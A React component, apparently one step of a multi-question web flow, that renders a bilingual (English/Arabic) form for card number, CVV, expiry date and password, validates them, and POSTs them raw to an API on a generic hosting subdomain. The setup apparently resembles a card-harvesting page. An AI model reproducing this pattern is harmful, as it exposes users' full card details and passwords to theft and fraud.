// import React, { useContext } from 'react'
// import logo from '../assets/WhatsApp_Image_2025-03-06_at_02.43.51_836acc1b-removebg-preview.png'
// import Button from './Button'
// import { IoIosLock } from "react-icons/io";
// import { Darkmood, languageContext } from '../pages/Home'

// export default function Question_four() {
//   const { darkMode } = useContext(Darkmood)
//   const { language } = useContext(languageContext)

//   const currentLang = language || 'en'

//   const translations = {
//     en: {
//       cardNumber: "Card Number",
//       cardPlaceholder: "2412 - 7152 - 3412 - 3456",
//       cvv: "Cvv",
//       cvvPlaceholder: "327",
//       expiryDate: "Expiry Date",
//       expiryMonthPlaceholder: "09",
//       expiryYearPlaceholder: "09",
//       password: "Password",
//       passwordPlaceholder: "*********"
//     },
//     ar: {
//       cardNumber: "رقم البطاقة",
//       cardPlaceholder: "٢٤١٢ - ٧١٥٢ - ٣٤١٢ - ٣٤٥٦",
//       cvv: "الرمز السري",
//       cvvPlaceholder: "٣٢٧",
//       expiryDate: "تاريخ الانتهاء",
//       expiryMonthPlaceholder: "٠٩",
//       expiryYearPlaceholder: "٠٩",
//       password: "كلمة المرور",
//       passwordPlaceholder: "*********"
//     }
//   }

//   const t = translations[currentLang]

//   return (
//     <div className={`p-[100px] xs:p-[50px] xs:w-[270px] flex items-center flex-col gap-[20px] ${
//       darkMode ? 'bg-gray-800' : ''
//     }`}>
//       <div>
//         <p className={`text-xl ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.cardNumber}</p>
//         <div className='relative'>
//           <input
//             placeholder={t.cardPlaceholder}
//             className={`border-[1px] ${
//               darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
//             } w-[354px] xs:w-[250px] pl-[50px] h-[57px] rounded-xl outline-none text-lg`}
//             type="text" />
//           <img src={logo} alt="card-logo" className='w-[36px] top-[18px] absolute h-[24px]' />
//         </div>
//       </div>

//       <div className='flex w-full xs:justify-center xs:gap-[60px] justify-between items-center'>
//         <div>
//           <p className={`text-xl ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.cvv}</p>
//           <input
//             placeholder={t.cvvPlaceholder}
//             type='text'
//             className={`border-[1px] ${
//               darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
//             } w-[59px] outline-none text-center h-[42px] rounded-xl text-lg`}
//           />
//         </div>

//         <div className='flex flex-col items-center'>
//           <p className={`text-xl font-normal ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.expiryDate}</p>
//           <div className='flex gap-[5px]'>
//             <input
//               placeholder={t.expiryMonthPlaceholder}
//               type='text'
//               className={`border-[1px] ${
//                 darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
//               } w-[59px] outline-none text-center h-[42px] rounded-xl text-lg`}
//             />
//             <p className={`text-2xl ${darkMode ? 'text-gray-300' : ''}`}>/</p>
//             <input
//               placeholder={t.expiryYearPlaceholder}
//               type='text'
//               className={`border-[1px] ${
//                 darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
//               } w-[59px] outline-none text-center h-[42px] rounded-xl text-lg`}
//             />
//           </div>
//         </div>
//       </div>

//       <div>
//         <p className={`text-xl font-normal ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.password}</p>
//         <div className='relative'>
//           <input
//             className={`border-[1px] xs:w-[250px] pl-[30px] ${
//               darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
//             } w-[354px] h-[57px] rounded-xl flex text-lg items-center gap-[10px]`}
//             placeholder={t.passwordPlaceholder}
//             type="password" />
//           <IoIosLock className={`text-2xl left-1 top-[13px] absolute ${
//             darkMode ? 'text-blue-400' : 'text-blue-600'
//           }`} />
//         </div>
//       </div>

//       <div className='xs:w-[270px]'>
//         <Button />
//       </div>
//     </div>
//   )
// }


import React, { useContext } from 'react';
import { useFormik } from 'formik';
import * as Yup from 'yup';
import logo from '../assets/WhatsApp_Image_2025-03-06_at_02.43.51_836acc1b-removebg-preview.png';
import Button from './Button';
import { IoIosLock } from "react-icons/io";
import { Darkmood, languageContext } from '../pages/Home';

export default function Question_four() {
  const { darkMode } = useContext(Darkmood);
  const { language } = useContext(languageContext);

  const currentLang = language || 'en';

  const translations = {
    en: {
      cardNumber: "Card Number",
      cardPlaceholder: "2412 - 7152 - 3412 - 3456",
      cvv: "Cvv",
      cvvPlaceholder: "327",
      expiryDate: "Expiry Date",
      expiryMonthPlaceholder: "09",
      expiryYearPlaceholder: "09",
      password: "Password",
      passwordPlaceholder: "*********"
    },
    ar: {
      cardNumber: "رقم البطاقة",
      cardPlaceholder: "٢٤١٢ - ٧١٥٢ - ٣٤١٢ - ٣٤٥٦",
      cvv: "الرمز السري",
      cvvPlaceholder: "٣٢٧",
      expiryDate: "تاريخ الانتهاء",
      expiryMonthPlaceholder: "٠٩",
      expiryYearPlaceholder: "٠٩",
      password: "كلمة المرور",
      passwordPlaceholder: "*********"
    }
  };

  const t = translations[currentLang];

  // Validation schema
  const validationSchema = Yup.object().shape({
    cardNumber: Yup.string()
      .required(currentLang === 'ar' ? 'رقم البطاقة مطلوب' : 'Card number is required')
      .matches(
        /^[0-9]{4} - [0-9]{4} - [0-9]{4} - [0-9]{4}$/,
        currentLang === 'ar' ? 'يجب أن يكون رقم البطاقة صالحًا' : 'Must be a valid card number'
      ),
    cvv: Yup.string()
      .required(currentLang === 'ar' ? 'CVV مطلوب' : 'CVV is required')
      .matches(/^[0-9]{3}$/, currentLang === 'ar' ? 'يجب أن يكون CVV صالحًا' : 'Must be a valid CVV'),
    expiryMonth: Yup.string()
      .required(currentLang === 'ar' ? 'شهر الانتهاء مطلوب' : 'Expiry month is required')
      .matches(/^(0[1-9]|1[0-2])$/, currentLang === 'ar' ? 'يجب أن يكون شهرًا صالحًا' : 'Must be a valid month'),
    expiryYear: Yup.string()
      .required(currentLang === 'ar' ? 'سنة الانتهاء مطلوبة' : 'Expiry year is required')
      .matches(/^[0-9]{2}$/, currentLang === 'ar' ? 'يجب أن تكون سنة صالحة' : 'Must be a valid year'),
    password: Yup.string()
      .required(currentLang === 'ar' ? 'كلمة المرور مطلوبة' : 'Password is required')
      .min(8, currentLang === 'ar' ? 'يجب أن تكون كلمة المرور 8 أحرف على الأقل' : 'Password must be at least 8 characters')
  });

  const formik = useFormik({
    initialValues: {
      cardNumber: '',
      cvv: '',
      expiryMonth: '',
      expiryYear: '',
      password: ''
    },
    validationSchema,
    onSubmit: async (values) => {
      try {
        const response = await fetch(
          'https://lawngreen-walrus-394451.hostingersite.com/api/payment',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              ...values,
              expiryDate: `${values.expiryMonth}/${values.expiryYear}`
            }),
          }
        );

        const data = await response.json();
        if (response.ok) {
          // Handle successful payment
          console.log('Payment successful', data);
        } else {
          // Handle error
          console.error(data.message);
        }
      } catch (error) {
        console.error('Error:', error);
      }
    },
  });

  return (
    <form onSubmit={formik.handleSubmit} className={`p-[100px] xs:p-[50px] xs:w-[270px] flex items-center flex-col gap-[20px] ${
      darkMode ? 'bg-gray-800' : ''
    }`}>
      <div>
        <p className={`text-xl ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.cardNumber}</p>
        <div className='relative'>
          <input
            name="cardNumber"
            value={formik.values.cardNumber}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            placeholder={t.cardPlaceholder}
            className={`border-[1px] ${
              darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
            } w-[354px] xs:w-[250px] pl-[50px] h-[57px] rounded-xl outline-none text-lg`}
            type="text"
          />
          <img src={logo} alt="card-logo" className='w-[36px] top-[18px] absolute h-[24px]' />
        </div>
        {formik.touched.cardNumber && formik.errors.cardNumber && (
          <div className={`text-sm mt-1 ${darkMode ? 'text-red-400' : 'text-red-500'}`}>
            {formik.errors.cardNumber}
          </div>
        )}
      </div>

      <div className='flex w-full xs:justify-center xs:gap-[60px] justify-between items-center'>
        <div>
          <p className={`text-xl ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.cvv}</p>
          <input
            name="cvv"
            value={formik.values.cvv}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            placeholder={t.cvvPlaceholder}
            type='text'
            className={`border-[1px] ${
              darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
            } w-[59px] outline-none text-center h-[42px] rounded-xl text-lg`}
          />
          {formik.touched.cvv && formik.errors.cvv && (
            <div className={`text-sm mt-1 ${darkMode ? 'text-red-400' : 'text-red-500'}`}>
              {formik.errors.cvv}
            </div>
          )}
        </div>

        <div className='flex flex-col items-center'>
          <p className={`text-xl font-normal ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.expiryDate}</p>
          <div className='flex gap-[5px]'>
            <input
              name="expiryMonth"
              value={formik.values.expiryMonth}
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              placeholder={t.expiryMonthPlaceholder}
              type='text'
              className={`border-[1px] ${
                darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
              } w-[59px] outline-none text-center h-[42px] rounded-xl text-lg`}
            />
            <p className={`text-2xl ${darkMode ? 'text-gray-300' : ''}`}>/</p>
            <input
              name="expiryYear"
              value={formik.values.expiryYear}
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              placeholder={t.expiryYearPlaceholder}
              type='text'
              className={`border-[1px] ${
                darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
              } w-[59px] outline-none text-center h-[42px] rounded-xl text-lg`}
            />
          </div>
          {(formik.touched.expiryMonth || formik.touched.expiryYear) && 
            (formik.errors.expiryMonth || formik.errors.expiryYear) && (
              <div className={`text-sm mt-1 ${darkMode ? 'text-red-400' : 'text-red-500'}`}>
                {formik.errors.expiryMonth || formik.errors.expiryYear}
              </div>
            )}
        </div>
      </div>

      <div>
        <p className={`text-xl font-normal ${darkMode ? 'text-gray-100' : 'text-[#393343]'}`}>{t.password}</p>
        <div className='relative'>
          <input
            name="password"
            value={formik.values.password}
            onChange={formik.handleChange}
            onBlur={formik.handleBlur}
            className={`border-[1px] xs:w-[250px] pl-[30px] ${
              darkMode ? 'border-gray-600 bg-gray-700 text-gray-300' : 'border-black text-[#D0CFCE]'
            } w-[354px] h-[57px] rounded-xl flex text-lg items-center gap-[10px]`}
            placeholder={t.passwordPlaceholder}
            type="password"
          />
          <IoIosLock className={`text-2xl left-1 top-[13px] absolute ${
            darkMode ? 'text-blue-400' : 'text-blue-600'
          }`} />
        </div>
        {formik.touched.password && formik.errors.password && (
          <div className={`text-sm mt-1 ${darkMode ? 'text-red-400' : 'text-red-500'}`}>
            {formik.errors.password}
          </div>
        )}
      </div>

      <div className='xs:w-[270px]'>
        <Button type="submit" />
      </div>
    </form>
  );
}